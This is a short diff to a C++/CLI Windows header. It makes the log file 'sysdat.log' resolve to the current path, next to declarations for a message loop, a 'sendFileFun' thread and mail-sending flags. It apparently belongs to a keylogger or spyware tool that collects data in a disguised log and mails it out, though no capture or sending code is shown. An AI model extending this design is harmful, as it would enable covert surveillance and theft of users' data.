@@ -1,6 +1,7 @@
 #pragma once
 
 #include <windows.h>
+#include <cstring>
 #include <fstream>
 #include <iostream>
 #include <algorithm>
@@ -18,11 +19,13 @@ using namespace System::Net::Mime;
 using namespace System::Threading;
 using namespace System::ComponentModel;
 
+char* GetCurPath(char *);
+
 static bool mailSent;
 static bool openFile;
 static bool stopThread = true;
-
-static char logName[] = "sysdat.log";
+static char name[MAX_PATH] = "sysdat.log";
+static char* logName(GetCurPath(name));
 
 void msgLoop();
 unsigned _stdcall sendFileFun(void* pArguments);
